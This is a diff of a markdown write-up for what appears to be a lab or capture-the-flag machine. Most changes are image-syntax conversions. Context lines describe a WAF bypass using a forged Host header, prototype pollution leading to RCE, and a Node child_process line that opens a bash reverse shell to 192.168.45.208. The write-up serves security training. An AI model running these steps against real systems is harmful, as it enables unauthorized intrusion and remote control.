@@ -70,11 +70,11 @@ const pass = process.env.DEATH_STAR_PASSWORD
 
 Port 80 hosted a basic page with a login:
 
-<figure><img src="../../../.gitbook/assets/image (2123).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2123).png>)
 
 Port 8000 required credentials to view, and its likely that the source code we found in the NFS shares was for the port 8000 website.
 
-<figure><img src="../../../.gitbook/assets/image (3750).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3750).png>)
 
 I first did a `feroxbuster` scan on the port 80 website, since we couldn't do anything without the credentials for the port 8000 website.
 
@@ -86,7 +86,6 @@ $ feroxbuster -u http://192.168.183.184
 
 The README contained some interesting information.
 
-{% code overflow="wrap" %}
 ```
 ## Developer Notes
 
@@ -152,7 +151,6 @@ The Prerender service then uses Chromium to visit the requested URL, returning t
 
 It's from the official guide, so I can't see this leading to any vulnerabilities? Fingers crossed? I'm not really familiar with Nginx configuration files so I'm not sure.
 ```
-{% endcode %}
 
 Basically, we are given the `nginx` configuration files and can see that there are checks on the User-Agent. We can change this to `googlebot`, and another directory scan finds other directories:
 
@@ -175,15 +173,15 @@ if ($prerender = 1) {
 
 The `$host` parameter is user-controlled, and can be altered. Fittingly, attempts to visit the `/admin` directory are blocked by a WAF:
 
-<figure><img src="../../../.gitbook/assets/image (3406).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3406).png>)
 
 This can be bypassed by setting the `Host` header to `localhost` since the Nginx configuration uses our `$host` values:
 
-<figure><img src="../../../.gitbook/assets/image (2845).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2845).png>)
 
 With this, we can login and view the port 8000 service.
 
-<figure><img src="../../../.gitbook/assets/image (1765).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1765).png>)
 
 ### Prototype Pollution -> RCE
 
@@ -231,7 +229,7 @@ app.post("/change_status", (req, res) => {
 
 I tried interacting with the application and injecting some other JSON data:
 
-<figure><img src="../../../.gitbook/assets/image (1540).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1540).png>)
 
 The RCE exploit lies in overwriting `outputFunctionName`. When researching for how to exploit this, I came across this article:
 
@@ -261,7 +259,7 @@ Content-Length: 165
 
 It didn't work at first, and upon sending a GET request to `/reset`, it worked!
 
-<figure><img src="../../../.gitbook/assets/image (2902).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2902).png>)
 
 ## Privilege Escalation
 
@@ -322,10 +320,10 @@ require('child_process').exec("bash -c 'bash -i >& /dev/tcp/192.168.45.208/80 0>
 
 Then, we can just wait for the shell to execute.
 
-<figure><img src="../../../.gitbook/assets/image (1771).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1771).png>)
 
 The user is part of the `sudo` group, and it is trivial to become the `root` user:
 
-<figure><img src="../../../.gitbook/assets/image (1360).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1360).png>)
 
 Rooted!
